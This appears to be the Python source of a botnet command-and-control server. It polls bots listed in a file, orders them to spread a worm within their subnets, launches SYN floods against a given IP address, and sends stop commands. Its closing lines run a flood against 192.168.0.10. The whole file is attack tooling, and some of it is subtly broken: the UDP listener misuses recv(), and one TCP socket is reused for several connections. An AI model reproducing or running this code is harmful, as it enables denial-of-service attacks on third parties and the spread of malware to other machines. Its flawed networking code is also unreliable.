import socket
import logging
import threading
import time

PORT = 1337

COMMANDS = ['HELO_S', 'ROLL', 'ATCK::0', 'ATCK::1::', 'STOP']

logging.basicConfig(level=logging.INFO,
        format='%(asctime)s PID:%(process)d %(message)s',
        datefmt='%H:%M:%S',
        filename='./cnc.log')
        #filename='/tmp/cnc.log')
logger = logging.getLogger('')

def listener():
    listen_sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    listen_sock.bind(('', PORT))

    while True:
        data, addr = listen_sock.recv(1024).decode('utf-8')
        print(data)

class Server:
    def __init__(self):
        with open('bots.txt', 'r') as infile:
            data = infile.read().split('\n')
            data.pop()
        self.bot_list = data
        self.available = data

    def get_state(self):
        """ Retrieves the status of each bot in the text file and updates the
        list of available bots to prepare for an attack.
        """
        logger.info('Retrieving bot availability.')
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        self.available = []

        for bot in self.bot_list:
            try:
                sock.connect((bot, PORT))
                sock.send(COMMANDS[0].encode('utf-8'))
                data = sock.recv(1024).decode('utf-8')
                logger.info('Received {} from {}'.format(data, bot))
                if 'REDY' in data:
                    self.available.append(bot)
            except Exception as e:
                logger.info('Failed to connect to: {}'.format(bot))
                logger.info('Reason: {}'.format(e))

        sock.close()
        logger.info('Bot availability updated.')

    def atck_0(self):
        """ Sends an 'ATCK::0' command to non-'BUSY' bots to infect other
        bots within its own subnet.
        """
        logger.info('Sending ATCK::0 command')
        self.get_state() # Update the available bots
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

        for bot in self.available:
            try:
                sock.connect((bot, PORT))
                sock.send(COMMANDS[2].encode('utf-8'))
            except Exception as e:
                logger.info('Failed to connect and init worm for: {}'.format(bot))
                logger.info('Reason: {}'.format(e))

        sock.close() 

    def atck_1(self, victim_ip):
        """ Sends an 'ATCK::1::xxx.xxx.xxx.xxx' command, which initiates a
        SYN flood attack on the victim specified.
        @param victim_ip: victim IPv4 address
        """
        logger.info('Init syn flood on: {}'.format(victim_ip))
        self.get_state()
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

        for bot in self.available:
            try:
                sock.connect((bot, PORT))
                comm = COMMANDS[3] + victim_ip
                sock.send(comm.encode('utf-8'))
                data = sock.recv(1024).decode('utf-8')
                logger.info("Received: '{}' from {}".format(data, bot))
            except Exception as e:
                logger.info('Failed to connect and init syn flood for: {}'.format(bot))
                logger.info('Reason: {}'.format(e))
        sock.close()

    def stop_atck(self):
        """ Sends a 'STOP' command to all bots to terminate any active attacks
        and set their state to 'REDY'.
        """
        logger.info('Stopping all attacks.')
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        for bot in self.bot_list:
            try:
                sock.connect((bot, PORT))
                comm = COMMANDS[4]
                sock.send(comm.encode('utf-8'))
                data = sock.recv(1024).decode('utf-8')
                logger.info('Stopping {}'.format(bot))
                logger.info("Received '{}' from {}".format(data, bot))
            except Exception as e:
                logger.info('Failed to stop {}:'.format(bot))
                logger.info('Reason: {}'.format(e))
        sock.close()

threading.Thread(target=listener).start()

serv = Server()
serv.get_state()
time.sleep(1)
serv.atck_1('192.168.0.10')
time.sleep(1)
serv.atck_0()
time.sleep(1)
serv.stop_atck()
